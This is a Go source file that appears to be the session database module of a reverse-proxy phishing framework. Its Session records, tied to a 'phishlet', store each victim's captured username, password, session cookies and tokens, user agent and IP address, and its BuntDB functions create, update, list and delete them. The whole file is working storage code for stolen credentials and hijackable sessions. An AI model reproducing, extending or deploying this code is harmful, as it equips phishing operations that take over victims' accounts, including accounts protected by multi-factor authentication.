package database

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/tidwall/buntdb"
)

const SessionTable = "sessions"

type Session struct {
	Id         int                          `json:"id"`
	Phishlet   string                       `json:"phishlet"`
	LandingURL string                       `json:"landing_url"`
	Username   string                       `json:"username"`
	Password   string                       `json:"password"`
	Custom     map[string]string            `json:"custom"`
	Tokens     map[string]map[string]*Token `json:"tokens"`
	SessionId  string                       `json:"session_id"`
	UserAgent  string                       `json:"useragent"`
	RemoteAddr string                       `json:"remote_addr"`
	CreateTime int64                        `json:"create_time"`
	UpdateTime int64                        `json:"update_time"`
}

type Token struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:         id,
		Phishlet:   phishlet,
		LandingURL: landing_url,
		Username:   "",
		Password:   "",
		Custom:     make(map[string]string),
		Tokens:     make(map[string]map[string]*Token),
		SessionId:  sid,
		UserAgent:  useragent,
		RemoteAddr: remote_addr,
		CreateTime: time.Now().UTC().Unix(),
		UpdateTime: time.Now().UTC().Unix(),
	}

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]*Token) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Tokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}
